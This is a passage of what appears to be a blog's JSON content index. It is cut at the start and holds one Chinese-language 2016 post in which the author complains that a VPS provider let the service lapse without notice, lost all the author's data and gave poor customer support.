php7.0-common","categories":[{"name":"linux","slug":"linux","permalink":"https://hooklife.me/categories/linux/"}],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"https://hooklife.me/tags/ubuntu/"},{"name":"php","slug":"php","permalink":"https://hooklife.me/tags/php/"}]},{"title":"一个垃圾的VPS提供商枫叶主机","slug":"一个垃圾的VPS提供商枫叶主机","date":"2016-05-05T14:29:12.000Z","updated":"2020-04-14T03:59:02.086Z","comments":true,"path":"杂乱/一个垃圾的VPS提供商枫叶主机/","link":"","permalink":"https://hooklife.me/杂乱/一个垃圾的VPS提供商枫叶主机/","excerpt":"对原来的vps不是很满意 就换了个vps找到一个以前经常在v2ex宣传的 枫叶vps http://www.fyvps.com 买了一个vps 整体体验也就一般般 经常丢包 但是影响也不是很大我觉得还行 就把老的服务器上的东西都迁移了过去,没想到…到期之钱没有任何邮件/电话通知 直接就不能续费了 并且里面的数据也都全部找不回来了 在群里跟他们沟通一下 他们让我提交工单 我也提交了一下然后说一会儿会有人联系我 最后把我从群里 T 了出去","text":"对原来的vps不是很满意 就换了个vps找到一个以前经常在v2ex宣传的 枫叶vps http://www.fyvps.com 买了一个vps 整体体验也就一般般 经常丢包 但是影响也不是很大我觉得还行 就把老的服务器上的东西都迁移了过去,没想到…到期之钱没有任何邮件/电话通知 直接就不能续费了 并且里面的数据也都全部找不回来了 在群里跟他们沟通一下 他们让我提交工单 我也提交了一下然后说一会儿会有人联系我 最后把我从群里 T 了出去 联系他们客服 他们客服的态度 然后他们的客服联系我 数据最后也没能找回来以前写的那么多博文都消失了开始想通过 google的cache找回来后来想想算了 就当一个暂新的开始把","categories":[{"name":"杂乱","slug":"杂乱","permalink":"https://hooklife.me/categories/杂乱/"}],"tags":[{"name":"vps","slug":"vps","permalink":"https://hooklife.me/tags/vps/"},{"name":"云主机","slug":"云主机","permalink":"https://hooklife.me/tags/云主机/"}]}]}